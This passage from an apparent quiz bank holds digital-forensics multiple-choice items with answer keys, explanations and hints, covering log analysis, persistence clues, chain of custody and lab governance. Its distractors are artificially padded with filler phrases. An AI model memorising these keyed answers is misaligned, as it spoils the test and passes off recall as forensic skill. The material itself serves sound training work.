    options: ["In a single public folder that all users on the network can see freely","In the app's own storage area on the device","In the SIM card that holds the subscriber identity of the phone","Only on the manufacturer's servers and never on the device itself"],
    correct: 1, why: "Per-app storage holds databases and caches.",
    hint: "App storage."
  },
  {
    id: 1368, rank: 2, role: "digital-forensics", topic: "Report Review Exhibit", difficulty: "ADVANCED",
    exhibit: "Finding 4: The user deleted the project files on 2025-10-11 to hide them.\nSupporting exhibit: (none cited)\nMethod: (not stated)\nReviewer: -",
    q: "What is wrong with this report finding?",
    options: ["It states a conclusion without citing the supporting evidence","It was reviewed by a second examiner before it was issued","It cites the exhibit number and the hash value of the image","It explains the method used and its known limits"],
    correct: 0, why: "Conclusions need traceable support.",
    hint: "Where is the evidence?"
  },
  {
    id: 1369, rank: 2, role: "digital-forensics", topic: "Browser Artefact Location", difficulty: "ADVANCED",
    q: "Where are Chrome history records normally kept?",
    options: ["In one text file stored on the shared network drive","In the computer's BIOS","In a database file inside the user's profile folder","In the printer's memory"],
    correct: 2, why: "Browsers store history in per-user databases.",
    hint: "User profile."
  },
  {
    id: 1370, rank: 2, role: "digital-forensics", topic: "Prefetch vs Amcache", difficulty: "ADVANCED",
    q: "What does Amcache evidence help show?",
    options: ["That the monitor was replaced by the supplier last year","That a user changed their wallpaper on a given date","That the printer was installed in the building by the facilities team","That a program existed or ran on the system with its hash"],
    correct: 3, why: "Amcache records program metadata and hashes.",
    hint: "Program record."
  },
  {
    id: 1371, rank: 2, role: "digital-forensics", topic: "Email Recovery Source", difficulty: "ADVANCED",
    q: "Where might deleted email still be found?",
    options: ["Only on the user's printer in the memory that holds the last pages that were printed","In the monitor's memory","In the mail database or server backups until overwritten, as a general rule","Nowhere once it has been deleted as the mail system erases all of the data at once"],
    correct: 2, why: "Mail stores and backups retain items.",
    hint: "Stores and backups."
  },
  {
    id: 1372, rank: 2, role: "digital-forensics", topic: "Chat Application Evidence", difficulty: "ADVANCED",
    q: "What do local databases of chat apps often contain?",
    options: ["The full source code of the app that the user installed","The credit card numbers of every user who installed it","Messages contacts, and timestamps, as a general rule","The home address of the app developers, and their staff"],
    correct: 2, why: "Local stores keep message content and times.",
    hint: "Local database."
  },
  {
    id: 1373, rank: 2, role: "digital-forensics", topic: "Cloud Storage Logs", difficulty: "ADVANCED",
    q: "What do cloud storage access logs show?",
    options: ["The internal design documents of the provider","The model of the laptop that the owner uses at home","The sizes of the staff's salary payments each month","Who accessed which object from where, and when"],
    correct: 3, why: "Access logs support investigations.",
    hint: "Who accessed."
  },
  {
    id: 1374, rank: 2, role: "digital-forensics", topic: "File Signature Analysis", difficulty: "ADVANCED",
    q: "Why compare a file's signature with its extension?",
    options: ["To rename the files to a new standard, in most cases","To delete files that are old","To increase the file size on the disk, as a general rule","To find files whose type was disguised"],
    correct: 3, why: "Mismatches may indicate hiding.",
    hint: "Signature mismatch."
  },
  {
    id: 1375, rank: 2, role: "digital-forensics", topic: "Log Source Reliability", difficulty: "ADVANCED",
    q: "Why should an examiner consider how reliable a log source is?",
    options: ["Logs never contain times, and cannot be ordered into a sequence of events at any point","Logs can be incomplete altered or have incorrect time settings","Logs cannot be copied","Logs are always accurate and, and they never need any checking by the examiner at all"],
    correct: 1, why: "Reliability affects the weight of the evidence.",
    hint: "Check reliability."
  },
  {
    id: 1376, rank: 2, role: "digital-forensics", topic: "Collecting from a Server", difficulty: "ADVANCED",
    q: "A production server cannot be taken offline. What is the BEST way to collect evidence?",
    options: ["Pull the power cord immediately","Copy files by drag, and drop, until the next scheduled review takes place","Use a documented live collection with minimal footprint and verify it","Delete logs to keep it running smoothly"],
    correct: 2, why: "Pulling the power is the runner-up as it stops changes, but it harms availability and loses volatile data.",
    hint: "Minimal footprint."
  },
  {
    id: 1377, rank: 2, role: "digital-forensics", topic: "Linux Log Source Exhibit", difficulty: "ADVANCED",
    exhibit: "Nov  9 03:11:02 srv sshd[8812]: Failed password for root from 203.0.113.51 port 50122 ssh2\nNov  9 03:11:04 srv sshd[8815]: Failed password for root from 203.0.113.51 port 50124 ssh2\nNov  9 03:11:07 srv sshd[8819]: Failed password for root from 203.0.113.51 port 50126 ssh2\nNov  9 03:11:09 srv sshd[8822]: Accepted password for root from 203.0.113.51 port 50128 ssh2",
    q: "What does this log excerpt show?",
    options: ["Repeated failed SSH logins followed by a success from the same address","A scheduled cron job running","A user logging out","A kernel update"],
    correct: 0, why: "Many failures then success suggest guessing.",
    hint: "Failures then success."
  },
  {
    id: 1378, rank: 2, role: "digital-forensics", topic: "Bash History Limits", difficulty: "ADVANCED",
    q: "Why can bash history alone be unreliable?",
    options: ["It stores the passwords of all users","It always records every command in every session","It cannot be read by an examiner","It can be edited cleared or not written for some sessions"],
    correct: 3, why: "History files depend on user settings and can be changed.",
    hint: "Not guaranteed."
  },
  {
    id: 1379, rank: 2, role: "digital-forensics", topic: "Docker Evidence", difficulty: "ADVANCED",
    q: "What can an examiner collect from a container host?",
    options: ["Nothing at all","Image layers container logs, and runtime metadata, in most cases","Only the monitor settings","The BIOS of the cloud provider"],
    correct: 1, why: "Container state can be captured from the host.",
    hint: "Layers and logs."
  },
  {
    id: 1380, rank: 2, role: "digital-forensics", topic: "Windows Services Review", difficulty: "ADVANCED",
    q: "What is a good first check on suspicious services?",
    options: ["Change the service name","Compare the binary path and signer against known good values, in most cases","Restart the computer repeatedly, and revisit the decision after the next release","Delete the service without recording it, and revisit the decision after the next release"],
    correct: 1, why: "Path and signer reveal unusual services.",
    hint: "Path and signer."
  },
  {
    id: 1381, rank: 2, role: "digital-forensics", topic: "Registry Persistence Exhibit", difficulty: "ADVANCED",
    exhibit: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  Updater = C:\\Users\\jlee\\AppData\\Local\\Temp\\svch0st.exe -s\n  OneDrive = C:\\Users\\jlee\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background",
    q: "What does this autorun entry suggest?",
    options: ["A font is installed","A program in a user temp folder is set to start at logon","A standard system component starts at logon, as a general rule","A printer driver is loaded"],
    correct: 1, why: "Autoruns pointing to temp folders are suspicious.",
    hint: "Where does it run from?"
  },
  {
    id: 1382, rank: 2, role: "digital-forensics", topic: "Data Exfiltration Indicators", difficulty: "ADVANCED",
    q: "Which combination best suggests data exfiltration?",
    options: ["Large archive creation followed by a big upload to an unknown host","A routine software update download from the vendor that finishes in a few minutes","A user reading email in the morning as part of the normal work routine for the team","A scheduled report job"],
    correct: 0, why: "Staging and outbound transfer are typical.",
    hint: "Stage then send."
  },
  {
    id: 1383, rank: 2, role: "digital-forensics", topic: "Email Forensics Header Spoof", difficulty: "ADVANCED",
    q: "A message appears to come from a manager but the Return-Path differs. What does this suggest?",
    options: ["The message was sent from the user's own phone","The message was encrypted","The message is always genuine","The sender address may have been forged"],
    correct: 3, why: "Header mismatches can indicate spoofing.",
    hint: "Compare headers."
  },
  {
    id: 1384, rank: 2, role: "digital-forensics", topic: "Endpoint Telemetry Gap", difficulty: "ADVANCED",
    q: "What is a limitation of relying only on endpoint tool alerts?",
    options: ["Alerts are always legally admissible","Alerts replace disk images","Tools never miss anything","Activity the tool does not log or detect will be missed"],
    correct: 3, why: "Coverage gaps leave blind spots.",
    hint: "Coverage."
  },
  {
    id: 1385, rank: 2, role: "digital-forensics", topic: "Legal Hold Process", difficulty: "ADVANCED",
    q: "What is a legal hold?",
    options: ["A process to speed up the backups","An instruction to preserve relevant data and not delete it","A request to delete old data, and the storage cost is reduced for the legal department","A type of encryption"],
    correct: 1, why: "Holds prevent loss of potentially relevant material.",
    hint: "Preserve."
  },
  {
    id: 1386, rank: 2, role: "digital-forensics", topic: "Time Source Validation", difficulty: "ADVANCED",
    q: "How can an examiner check the accuracy of a system clock?",
    options: ["Compare it with an authoritative time source, and record the offset, as a general rule","Assume it is correct","Reset it to the current time","Ask the user"],
    correct: 0, why: "Offsets are needed to correct timestamps.",
    hint: "Measure the offset."
  },
  {
    id: 1387, rank: 2, role: "digital-forensics", topic: "Wiping Tool Indicators", difficulty: "ADVANCED",
    q: "What may suggest a secure deletion tool was used?",
    options: ["A normal looking document folder that contains the usual files for the department's project","A recent software update","A new desktop icon","Large areas of uniform patterned data and tool execution traces"],
    correct: 3, why: "Patterns and tool traces point to wiping.",
    hint: "Patterns and traces."
  },
  {
    id: 1388, rank: 2, role: "digital-forensics", topic: "Interpreting Hash Hits", difficulty: "ADVANCED",
    q: "A file hash matches a known malicious sample. What is the correct next step?",
    options: ["Ignore it","Delete the file at once, until the next scheduled review takes place","Treat it as strong evidence and corroborate it with other artefacts","Close the case"],
    correct: 2, why: "Corroboration strengthens the finding.",
    hint: "Corroborate."
  },
  {
    id: 1389, rank: 2, role: "digital-forensics", topic: "Collecting Router Logs", difficulty: "ADVANCED",
    q: "Why might router logs be useful in an incident?",
    options: ["They hold the user's passwords","They can show traffic paths and connections between networks","They store the contents of all user documents","They replace the need for firewalls"],
    correct: 1, why: "Network devices log communications.",
    hint: "Traffic paths."
  },
  {
    id: 1390, rank: 2, role: "digital-forensics", topic: "Ephemeral Data Exhibit", difficulty: "ADVANCED",
    exhibit: "Scene note 11:20: Server found with suspicious process. Technician rebooted to 'clear the problem' at 11:35.\nMemory image: not captured\nDisk image: taken 14:10 after reboot",
    q: "What is the concern in this evidence note?",
    options: ["Volatile data was lost because the machine was rebooted before collection","A custody form was completed","The memory image was hashed, and stored","A write blocker was used for the disk"],
    correct: 0, why: "Rebooting destroys memory contents.",
    hint: "What was lost?"
  },
  {
    id: 1391, rank: 2, role: "digital-forensics", topic: "Social Media Evidence", difficulty: "ADVANCED",
    q: "How should an examiner capture a social media post as evidence?",
    options: ["Memorise the content","Share it with colleagues","Preserve the content with its URL timestamp and capture method documented","Take a rough photo with no details, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Context and method make web evidence credible.",
    hint: "Document capture."
  },
  {
    id: 1392, rank: 2, role: "digital-forensics", topic: "Examiner Bias", difficulty: "ADVANCED",
    q: "What is confirmation bias in an examination?",
    options: ["Favouring evidence that supports an existing theory","Writing short notes, until the next scheduled review takes place","Checking hashes, until the next scheduled review takes place","Choosing the best tool, until the next scheduled review takes place"],
    correct: 0, why: "Examiners should test alternative explanations.",
    hint: "Alternative theories."
  },
  {
    id: 1393, rank: 2, role: "digital-forensics", topic: "Cross-Validation of Tools", difficulty: "ADVANCED",
    q: "Why verify an important finding with a second tool?",
    options: ["To delay the case","To make the report longer, and it appears more detailed to the reader of the report","To confirm that the result is not an error of one tool","To avoid taking notes"],
    correct: 2, why: "Independent confirmation strengthens reliability.",
    hint: "Second tool."
  },
  {
    id: 1394, rank: 2, role: "digital-forensics", topic: "Disk Slack Exhibit", difficulty: "ADVANCED",
    exhibit: "Offset 0x1A4F20 (slack of file report_v2.docx): '...salary adjustments for Q4 are attached. Please do not forward outside HR...'\nFile report_v2.docx contains: unrelated meeting notes",
    q: "What does this carved text from slack space suggest?",
    options: ["Fragments of a previously existing document remained on the disk","The text is a virus","The disk is blank","The disk is encrypted"],
    correct: 0, why: "Slack and unallocated areas can retain old data.",
    hint: "Where was it found?"
  },
  {
    id: 1395, rank: 2, role: "digital-forensics", topic: "Wireless Log Evidence", difficulty: "ADVANCED",
    q: "What can wireless controller logs show in an investigation?",
    options: ["The speed test results of each employee who visited the building","Which devices associated with which access point, and when","The passwords that staff have chosen for their personal phones","The contents of every message sent over the wireless network"],
    correct: 1, why: "Association logs link devices to locations and times.",
    hint: "Device and AP."
  },
  {
    id: 1396, rank: 2, role: "digital-forensics", topic: "Browser Download Records", difficulty: "ADVANCED",
    q: "What do browser download records help show?",
    options: ["The model of the printer that was used to print the pages","Which files were downloaded from where, and when","The passwords saved in the profile of the user at the machine","The full content of the web pages that were last opened by the person"],
    correct: 1, why: "Download records tie files to sources.",
    hint: "Source and time."
  },
  {
    id: 1397, rank: 2, role: "digital-forensics", topic: "Email Server Logs", difficulty: "ADVANCED",
    q: "What do mail server logs add to an examination of a single mailbox?",
    options: ["Delivery and routing records that can confirm when messages were sent","The names of the staff who built the mail system years ago, in most cases","The hardware passwords of every server in the data centre, as a general rule","A copy of every attachment that all users have ever sent"],
    correct: 0, why: "Server logs corroborate client-side evidence.",
    hint: "Server side."
  },
  {
    id: 1398, rank: 2, role: "digital-forensics", topic: "Virtual Machine Evidence", difficulty: "ADVANCED",
    q: "What should an examiner collect from a suspect virtual machine?",
    options: ["The virtual disk and any memory or snapshot files with hashes","Only a screenshot of the guest desktop that the user left open","A shortcut to the virtual machine from the host's desktop folder","Nothing as virtual machines hold no useful data at all"],
    correct: 0, why: "Virtual machine files contain the full guest state.",
    hint: "Disk plus state."
  },
  {
    id: 1399, rank: 2, role: "digital-forensics", topic: "Spreadsheet Metadata Exhibit", difficulty: "ADVANCED",
    exhibit: "Document: Forecast-Q4.xlsx\nCreated: 2025-09-12 10:02  Author: m.hughes\nLast saved: 2025-10-29 22:47  Last saved by: temp_contractor\nCompany: Northwind Ltd  Revision: 31",
    q: "What does this document metadata suggest?",
    options: ["The file was last saved by a different user than its author","The file belongs to the examiner","The file was created by the printer","The file was never saved"],
    correct: 0, why: "Author and last-saved-by fields show different accounts handled the file.",
    hint: "Compare the users."
  },
  {
    id: 1400, rank: 2, role: "digital-forensics", topic: "Quality Control in the Lab", difficulty: "ADVANCED",
    q: "What does a laboratory quality system usually require?",
    options: ["No records, and cases remain secret","Different methods for each examiner on each day","Documented procedures validated tools and regular checks","Informal habits that change with each case"],
    correct: 2, why: "Quality systems make results repeatable and defensible.",
    hint: "Documented procedures."
  },
  {
    id: 1401, rank: 3, role: "digital-forensics", topic: "Forensic Readiness Programme", difficulty: "EXPERT",
    q: "What is the main aim of forensic readiness?",
    options: ["To remove all records after a year","To replace incident response","To make sure useful evidence is available, and usable when an incident occurs","To avoid collecting any logs, and the company holds no data that could be demanded later"],
    correct: 2, why: "Readiness plans logging retention and handling in advance.",
    hint: "Prepare in advance."
  },
  {
    id: 1402, rank: 3, role: "digital-forensics", topic: "Evidence Management System", difficulty: "EXPERT",
    q: "Which feature is most important in an evidence management system?",
    options: ["Unlimited public access to files","Automatic deletion after every case","Tamper-evident records of every access transfer and hash check","A colourful dashboard for visitors that shows the number of cases handled by the laboratory"],
    correct: 2, why: "Custody and integrity records give the system value.",
    hint: "Tamper-evident."
  },
  {
    id: 1403, rank: 3, role: "digital-forensics", topic: "Lab Accreditation Value", difficulty: "EXPERT",
    q: "Why might a forensic lab seek accreditation to a recognised standard?",
    options: ["It removes the need to keep notes of the work as the standard says it is optional","It demonstrates validated methods and consistent quality to courts","It makes all of the findings automatically true and courts never question the lab","It lets the lab skip peer review"],
    correct: 1, why: "Accreditation signals competence and control.",
    hint: "Demonstrate quality."
  },
  {
    id: 1404, rank: 3, role: "digital-forensics", topic: "Centralised Log Design", difficulty: "EXPERT",
    q: "Which design best supports later investigations?",
    options: ["Logs deleted every week to keep the storage cost for the monitoring platform at a low level","Central protected storage of key logs with agreed retention and time sync, in most cases","Logs readable by everyone","Logs kept only on each machine where the local administrator can read, and change them freely"],
    correct: 1, why: "Central, protected and time-aligned logs support reliable analysis.",
    hint: "Central and protected."
  },
  {
    id: 1405, rank: 3, role: "digital-forensics", topic: "Triage at Scale", difficulty: "EXPERT",
    q: "How should a team investigate a possible breach across thousands of hosts?",
    options: ["Image every host in full at once","Wait for users to report problems","Examine only the oldest machines","Use scripted triage collection to find affected hosts before deep imaging"],
    correct: 3, why: "Triage scales the work and prioritises hosts for deeper analysis.",
    hint: "Triage first."
  },
  {
    id: 1406, rank: 3, role: "digital-forensics", topic: "Cloud Evidence Strategy", difficulty: "EXPERT",
    q: "What should an organisation plan for evidence in a cloud service?",
    options: ["Contractual access to logs and snapshots plus tested collection procedures","Only screenshots taken by the administrator of the console on the day that the incident occurs","Deleting data quickly","Nothing at all as the provider handles all of the evidence needs of every customer account"],
    correct: 0, why: "Provider cooperation and technical methods must be arranged beforehand.",
    hint: "Plan access."
  },
  {
    id: 1407, rank: 3, role: "digital-forensics", topic: "Retention Policy Design", difficulty: "EXPERT",
    q: "What is the BEST way to set a log retention period?",
    options: ["Let each administrator choose","Base it on legal duties and the time attacks usually take to be found","Keep logs only for one day to save space","Keep every log forever regardless of cost"],
    correct: 1, why: "One day is the runner-up as it is cheap, but most breaches are found weeks later when the evidence has gone.",
    hint: "Legal and detection need."
  },
  {
    id: 1408, rank: 3, role: "digital-forensics", topic: "Evidence Held Abroad", difficulty: "EXPERT",
    q: "What must be considered when evidence is stored in another country?",
    options: ["The colour of the servers that the provider uses in the data centre of the region","Only the language in which the files were written by the users of the system in that country","Only the size of the files that were found on the servers in the other country","Local law on access privacy and transfer of the data"],
    correct: 3, why: "Jurisdiction affects how evidence may be accessed and moved.",
    hint: "Jurisdiction."
  },
  {
    id: 1409, rank: 3, role: "digital-forensics", topic: "Insider Case Handling", difficulty: "EXPERT",
    q: "Why involve legal and HR early in an insider investigation?",
    options: ["To ensure the work is lawful proportionate, and fair to the employee","To tell the suspect about it at once, and they can prepare their answers for the meeting","To avoid keeping any records","To delay the case until the employee has left the company, and cannot be asked any questions"],
    correct: 0, why: "Early advice protects the integrity of the process.",
    hint: "Lawful and fair."
  },
  {
    id: 1410, rank: 3, role: "digital-forensics", topic: "Preservation Notice", difficulty: "EXPERT",
    q: "What should a preservation notice to the business make clear?",
    options: ["Which staff to blame for the incident and managers can start their disciplinary process","Where to buy the tools that will be needed to collect the evidence from the devices","What must be kept who is responsible and for how long","How to delete the data quickly and it does not take up space on the file servers"],
    correct: 2, why: "A clear notice avoids loss of relevant data.",
    hint: "What and who."
  },
  {
    id: 1411, rank: 3, role: "digital-forensics", topic: "Single Point of Failure", difficulty: "EXPERT",
    q: "What is a risk of having one examiner with all the knowledge?",
    options: ["The examiner would never want to use any of the tools that the lab has bought","The examiner would be unable to read the evidence that other people have collected","The examiner would always make errors in the reports that they write for the courts","Work stops if they are absent"],
    correct: 3, why: "Knowledge should be shared and documented.",
    hint: "Key person risk."
  },
  {
    id: 1412, rank: 3, role: "digital-forensics", topic: "Tool Validation Plan", difficulty: "EXPERT",
    q: "What is the purpose of tool validation?",
    options: ["To confirm a tool works as expected","To avoid the need for any training of the staff who will use the tool in future","To let the lab buy a cheaper tool without testing it on any evidence","To prove that the vendor of the tool is the best one on the market in every case"],
    correct: 0, why: "Validation shows fitness for purpose.",
    hint: "Fit for purpose."
  },
  {
    id: 1413, rank: 3, role: "digital-forensics", topic: "Timeline Tool Trust", difficulty: "EXPERT",
    q: "How should results from a timeline tool be treated?",
    options: ["As a replacement for the original evidence which can then be safely deleted","As leads to verify against source artefacts, in most cases","As something that never contains any errors if the tool is expensive","As final proof that needs no further checking by any examiner in the lab"],
    correct: 1, why: "Tools can misinterpret data so verification is needed.",
    hint: "Verify."
  },
  {
    id: 1414, rank: 3, role: "digital-forensics", topic: "Evidence Room Exhibit", difficulty: "EXPERT",
    exhibit: "Evidence store E-02\nKey holders: 14 staff (incl. cleaning contractor)\nAccess log: none\nCCTV: not installed\nLast audit: 2022",
    q: "Which weakness does this access list show?",
    options: ["Too many people can enter and no entry is recorded","Entry is limited to two named custodians and every visit is recorded in a signed register","Only the custodian has a key","A camera covers the door"],
    correct: 0, why: "Uncontrolled access breaks custody.",
    hint: "Who can enter?"
  },
  {
    id: 1415, rank: 3, role: "digital-forensics", topic: "Backup of Case Data", difficulty: "EXPERT",
    q: "How should case data be protected against loss?",
    options: ["Encrypted backups stored separately with access control, as a general rule","A copy on a shared folder that every employee in the company can open, and edit","A copy emailed to a private account, and it is always available to the examiner","A single copy on a laptop that the examiner takes home on the train every evening"],
    correct: 0, why: "Backups must be secure and independent.",
    hint: "Secure backups."
  },
  {
    id: 1416, rank: 3, role: "digital-forensics", topic: "Court Presentation Planning", difficulty: "EXPERT",
    q: "What helps a lay jury understand technical evidence?",
    options: ["A promise that the examiner is always right, and should never be questioned at all","Clear simple explanations with visual aids","Long lists of file names which the jury members can read during the lunch break","Dense technical language that shows the expertise of the witness in every sentence"],
    correct: 1, why: "Clarity helps decision makers.",
    hint: "Simple and visual."
  },
  {
    id: 1417, rank: 3, role: "digital-forensics", topic: "Evidence Retention Exhibit", difficulty: "EXPERT",
    exhibit: "Source          Retention (days)\nFirewall        14\nAuthentication  14\nEmail gateway   365\nEndpoint EDR    90\nLegal minimum for incident evidence: 180",
    q: "What problem does this retention table reveal?",
    options: ["All logs are kept for a full year and the retention has been approved by the legal team","Logs are backed up offsite","Firewall and authentication logs are kept for only 14 days","Retention is reviewed by the legal department each year and updated to the newest rule"],
    correct: 2, why: "Short retention for key logs will lose evidence.",
    hint: "Look at the days."
  },
  {
    id: 1418, rank: 3, role: "digital-forensics", topic: "Distributed Acquisition Tools", difficulty: "EXPERT",
    q: "What is a benefit of remote forensic collection agents?",
    options: ["They encrypt the whole network","They allow evidence collection from many sites without travel","They make the evidence public","They eliminate the need for hashes as the agent software records the state itself"],
    correct: 1, why: "Remote tools speed response across locations.",
    hint: "Remote collection."
  },
  {
    id: 1419, rank: 3, role: "digital-forensics", topic: "Case Management Metrics", difficulty: "EXPERT",
    q: "Which metric best shows a lab is managing cases well?",
    options: ["Turnaround time for priority cases and rework rate","The number of printers in the lab, as a general rule","The number of staff on holiday","The colour of the lab"],
    correct: 0, why: "Timeliness and quality show management health.",
    hint: "Time and quality."
  },
  {
    id: 1420, rank: 3, role: "digital-forensics", topic: "Mobile Fleet Readiness", difficulty: "EXPERT",
    q: "How can an organisation prepare to investigate company phones?",
    options: ["Collect personal data from all staff constantly","Ban all phones from the building","Use management tools that keep inventory logs and allow lawful collection","Allow any device without records"],
    correct: 2, why: "Preparedness enables proportionate investigation.",
    hint: "Inventory and logs."
  },
  {
    id: 1421, rank: 3, role: "digital-forensics", topic: "Chain of Custody for Cloud", difficulty: "EXPERT",
    q: "How can custody be shown for data collected from a cloud service?",
    options: ["Copy the data by hand","Record the provider method time hashes and who performed the collection","Ask the provider to confirm verbally, and review the outcome at the next monthly meeting","Take a screenshot only, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Digital records support the chain.",
    hint: "Record the method."
  },
  {
    id: 1422, rank: 3, role: "digital-forensics", topic: "Escalation to Law Enforcement", difficulty: "EXPERT",
    q: "An investigation shows serious crime. What is the BEST approach regarding law enforcement?",
    options: ["Share the evidence publicly first, and review the outcome at the next monthly meeting","Decide informally without legal input, and revisit the decision after the next release","Delete data before they arrive","Involve legal counsel and follow a defined escalation and evidence handover process"],
    correct: 3, why: "Informal decisions are the runner-up as they are quick, but they risk mishandling evidence and legal exposure.",
    hint: "Defined process."
  },
  {
    id: 1423, rank: 3, role: "digital-forensics", topic: "Examiner Training Plan", difficulty: "EXPERT",
    q: "What should a training plan for examiners include?",
    options: ["Only vendor sales events that the tool suppliers run for the benefit of their customers","No updates after the first year as the skills learned at the start do not go out of date","A single exam once","Core skills new technologies and regular competence checks"],
    correct: 3, why: "Continuous development keeps skills current.",
    hint: "Ongoing."
  },
  {
    id: 1424, rank: 3, role: "digital-forensics", topic: "Time Normalisation Design", difficulty: "EXPERT",
    q: "How should a platform store timestamps from many sources?",
    options: ["In whatever format each source uses with no notes, as a general rule","In one standard time with the original value, and offset kept","Rounded to the nearest day","Without time zones"],
    correct: 1, why: "Normalisation keeps correlation accurate and traceable.",
    hint: "Standard plus original."
  },
  {
    id: 1425, rank: 3, role: "digital-forensics", topic: "Collection Authority Exhibit", difficulty: "EXPERT",
    exhibit: "Request: Image 12 employee laptops for suspected data leak\nApproved by: IT Manager\nDate: 2025-11-04  Ticket: SEC-8841\nLegal basis: (blank)   Privacy review: (blank)   HR notified: no",
    q: "What does this approval record lack?",
    options: ["The legal basis for collecting personal data from staff devices","The name of the approver who signed the request on behalf of the information technology team","The date of approval that is needed to show when the request was made and by whom it was made","The ticket number that links the request to the service desk system of the company"],
    correct: 0, why: "Collection must be lawful and proportionate.",
    hint: "Legal basis."
  },
  {
    id: 1426, rank: 3, role: "digital-forensics", topic: "Lab Contamination Control", difficulty: "EXPERT",
    q: "How can contamination between cases be avoided?",
    options: ["Skip hashing","Share one folder for all cases, until the next scheduled review takes place","Use sanitised media and clean workstations with documented checks","Reuse drives without wiping, until the next scheduled review takes place"],
    correct: 2, why: "Clean media avoid mixing evidence.",
    hint: "Sanitised media."
  },
  {
    id: 1427, rank: 3, role: "digital-forensics", topic: "Disk Encryption Policy for Investigations", difficulty: "EXPERT",
    q: "How can an organisation prepare for investigating encrypted laptops?",
    options: ["Avoid using any encryption, as a general rule","Disable encryption to make access easy","Print passwords for each user, as a general rule","Escrow recovery keys under strict governance"],
    correct: 3, why: "Key escrow allows lawful access.",
    hint: "Recovery keys."
  },
  {
    id: 1428, rank: 3, role: "digital-forensics", topic: "Information Sharing", difficulty: "EXPERT",
    q: "How should an organisation share investigation findings with other bodies?",
    options: ["By posting the findings online and other organisations can see, and learn from them at once","By email to everyone in the company and all staff are aware of the investigation","Through approved channels with sensitive data minimised","By sending the raw evidence to every outside body that has shown any interest in it"],
    correct: 2, why: "Sharing should be controlled and lawful.",
    hint: "Approved channels."
  },
  {
    id: 1429, rank: 3, role: "digital-forensics", topic: "Examiner Wellbeing", difficulty: "EXPERT",
    q: "Why is examiner wellbeing a governance concern?",
    options: ["It never matters","Exposure to disturbing material can harm staff and quality","It only affects managers","It is a tool problem"],
    correct: 1, why: "Support improves safety and work quality.",
    hint: "Protect staff."
  },
  {
    id: 1430, rank: 3, role: "digital-forensics", topic: "Automation in Lab Work", difficulty: "EXPERT",
    q: "What is a risk of heavily automated analysis pipelines?",
    options: ["They always make errors","Errors can go unnoticed if results are not reviewed","They cannot save time","They produce no logs"],
    correct: 1, why: "Automation needs checks.",
    hint: "Review output."
  },
  {
    id: 1431, rank: 3, role: "digital-forensics", topic: "Strategy for Ransomware Cases", difficulty: "EXPERT",
    q: "After a ransomware attack, what is the BEST evidence priority for the investigation?",
    options: ["Wipe the encrypted disks to avoid confusion, and review the outcome at the next monthly meeting","Rebuild all systems immediately to restore service","Pay, and delete all logs","Preserve volatile data logs and a representative set of affected images before rebuilding"],
    correct: 3, why: "Immediate rebuild is the runner-up since it restores service, but it destroys evidence needed to find the entry point and scope.",
    hint: "Preserve before rebuild."
  },
  {
    id: 1432, rank: 3, role: "digital-forensics", topic: "Digital Evidence Admissibility", difficulty: "EXPERT",
    q: "What commonly affects whether digital evidence is accepted by a court?",
    options: ["Whether it was obtained lawfully and its integrity can be shown","Whether it is long enough to fill the folder that the court clerk has set aside for it","Whether it is held on a new device that the examiner has just bought from the supplier","Whether it has colour screenshots that make the pages in the bundle easier to read"],
    correct: 0, why: "Legality and integrity are key.",
    hint: "Lawful and intact."
  },
  {
    id: 1433, rank: 3, role: "digital-forensics", topic: "Review of Findings Exhibit", difficulty: "EXPERT",
    exhibit: "Conclusion: 'Mr Davies stole the customer database on 8 Nov.'\nEvidence: laptop of Mr Davies had a 4 GB archive created 8 Nov 17:12; account davies logged on at 17:05.\nNot examined: other users of the laptop; network upload logs.",
    q: "What should the reviewer challenge in this conclusion?",
    options: ["The limits are stated","The tool versions are recorded","The hashes are listed","The conclusion goes beyond what the evidence shows"],
    correct: 3, why: "Overstated conclusions harm credibility.",
    hint: "Evidence versus claim."
  },
  {
    id: 1434, rank: 3, role: "digital-forensics", topic: "Incident Evidence Triage Policy", difficulty: "EXPERT",
    q: "What should a triage policy define?",
    options: ["The type of laptop to buy","The staff holiday dates","The colour of the labels","Which evidence is collected first and by whom"],
    correct: 3, why: "Clear order of collection avoids loss.",
    hint: "Order and owner."
  },
  {
    id: 1435, rank: 3, role: "digital-forensics", topic: "Handling Privileged Data", difficulty: "EXPERT",
    q: "How should material protected by legal privilege be handled during a review?",
    options: ["Delete it","Share it with the suspect, and review the outcome at the next monthly meeting","Separate it using a defined process and keep it from the investigators","Read it all and decide later"],
    correct: 2, why: "Privilege requires a controlled review.",
    hint: "Separate it."
  },
  {
    id: 1436, rank: 3, role: "digital-forensics", topic: "Supply of Tools", difficulty: "EXPERT",
    q: "How should a lab manage the licences and versions of its forensic tools?",
    options: ["Ignore versions, and revisit the decision after the next release","Keep an inventory and record the version used in each case","Share licences freely, and review the outcome at the next monthly meeting","Use whichever copy is found"],
    correct: 1, why: "Version records support reproducibility.",
    hint: "Record versions."
  },
  {
    id: 1437, rank: 3, role: "digital-forensics", topic: "Forensic Data Lake Design", difficulty: "EXPERT",
    q: "What is a key control for a platform holding evidence from many cases?",
    options: ["Strict case-level access control and audit logging, as a general rule","One shared account that every analyst in the company uses to log in to the platform each day","Public access","No logging"],
    correct: 0, why: "Cases must be separated and accountable.",
    hint: "Case-level access."
  },
  {
    id: 1438, rank: 3, role: "digital-forensics", topic: "Cost Benefit of Readiness", difficulty: "EXPERT",
    q: "How can leaders judge the value of forensic readiness spending?",
    options: ["By comparing it with the cost, and impact of incidents it helps resolve","By counting the tools bought","By the number of staff","By the length of policies"],
    correct: 0, why: "Value is shown in better outcomes.",
    hint: "Outcomes."
  },
  {
    id: 1439, rank: 3, role: "digital-forensics", topic: "Chain of Custody Audit", difficulty: "EXPERT",
    q: "What should an internal audit of custody records check?",
    options: ["That the room is tidy","That the staff are happy","That the labels are pretty","That every transfer is signed timed and matched to the item"],
    correct: 3, why: "Auditors test completeness and accuracy.",
    hint: "Complete records."
  },
  {
    id: 1440, rank: 3, role: "digital-forensics", topic: "Report Template Governance", difficulty: "EXPERT",
    q: "Why standardise a forensic report template?",
    options: ["It hides the method","It removes the need for opinions","It keeps reports consistent complete and easier to review","It shortens every case"],
    correct: 2, why: "Standard structure supports quality.",
    hint: "Consistency."
  },
  {
    id: 1441, rank: 3, role: "digital-forensics", topic: "Large Evidence Volumes", difficulty: "EXPERT",
